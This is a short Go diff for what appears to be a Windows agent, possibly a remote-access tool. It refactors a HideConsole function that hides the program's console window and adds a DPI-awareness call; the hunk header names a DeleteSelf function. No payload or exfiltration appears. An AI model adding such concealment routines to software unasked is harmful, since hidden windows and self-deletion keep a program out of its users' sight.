@@ -721,15 +721,23 @@ func DeleteSelf() ([]byte, error) {
 
 }
 
-func HideConsole() ([]byte, error) {
+func HideConsole() error {
 	if getConsoleWindow.Find() == nil && showWindow.Find() == nil {
 		hwnd, _, _ := getConsoleWindow.Call()
 		if hwnd != 0 {
 			_, _, err := showWindow.Call(hwnd, windows.SW_HIDE)
 			if err != nil {
-				return nil, err
+				return err
 			}
 		}
 	}
-	return []byte("hide success"), nil
+	return nil
+}
+
+func SetProcessDPIAware() error {
+	_, _, err := user32.NewProc("SetProcessDPIAware").Call(0)
+	if err != nil {
+		return err
+	}
+	return nil
 }
